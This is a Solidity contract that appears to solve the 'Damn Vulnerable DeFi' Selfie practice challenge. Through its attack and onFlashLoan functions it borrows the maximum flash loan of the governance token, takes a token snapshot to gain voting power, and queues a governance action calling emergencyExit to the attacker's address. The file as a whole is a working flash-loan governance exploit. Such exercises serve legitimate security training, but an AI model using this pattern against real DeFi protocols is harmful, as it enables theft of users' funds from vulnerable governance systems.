// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableTokenSnapshot} from "../../DamnValuableTokenSnapshot.sol";

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory);
    function getGovernanceToken() external view returns (address token);
    function getActionCounter() external view returns (uint256);
}

interface ISelfiePool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        returns (bool);
    function maxFlashLoan(address _token) external view returns (uint256);
}

contract HackSimpleGovernance is Ownable {
    ISimpleGovernance private governance;
    ISelfiePool private pool;
    DamnValuableTokenSnapshot private token;

    uint256 actionId;

    constructor(address _governance, address _pool) {
        governance = ISimpleGovernance(_governance);
        pool = ISelfiePool(_pool);
        token = DamnValuableTokenSnapshot(governance.getGovernanceToken());
    }

    function attack() external onlyOwner {
        uint256 amountFlash = pool.maxFlashLoan(address(token));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner());
        require(
            pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amountFlash, data), "flash loan failed"
        );
    }

    function onFlashLoan(address initiator, address, uint256 amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        require(msg.sender == address(pool), "only pool");
        require(initiator == address(this), "only initiator");

        token.snapshot();

        governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
